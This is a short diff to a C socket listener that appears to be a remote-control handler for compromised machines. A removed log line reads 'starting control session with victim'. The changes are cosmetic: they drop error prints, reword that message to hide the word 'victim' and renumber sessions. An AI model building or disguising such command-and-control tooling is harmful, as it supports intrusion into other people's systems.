@@ -66,8 +66,8 @@ void *Acceptor(void *arg){
 		
 				if ((activity < 0) && (errno!=EINTR)) {
 			
-					printf("select error");
-			
+			      ;;
+
 				}
 
 				if (FD_ISSET(master_socket, &readfds)) {
@@ -79,8 +79,8 @@ void *Acceptor(void *arg){
 		
 				if ((activity < 0) && (errno!=EINTR)) {
 			
-				printf("select error");
-			
+		          ;;	
+
 				}
 
 				if (FD_ISSET(master_socket, &readfds)) {
@@ -92,7 +92,7 @@ void *Acceptor(void *arg){
 			
 					}
 							
-					printf("Connection received - starting control session with victim %s\n", inet_ntoa(cli.sin_addr));
+					printf("Connection received with %s\n", inet_ntoa(cli.sin_addr));
 					// add new socket to an array of sockets
 					
 					for (i = 0; i < max_clients; i++) {
@@ -101,7 +101,7 @@ void *Acceptor(void *arg){
 						if( client_socket[i] == 0 ){
 						
 							client_socket[i] = new_socket;
-							printf("Adding as session %d\n" , i);
+							printf("Adding as session %d\n" , i+1);
 								
 							break;
 						}
@@ -192,7 +192,7 @@ int CreateServerSocket(char *address, char *port, int *type, int *family)
     }
 
     freeaddrinfo(servinfo);
-    printf("Listener started... awaiting connection\n");
+    printf("Listener started... awaiting connection\n\n");
     return sockfd;
 }
 
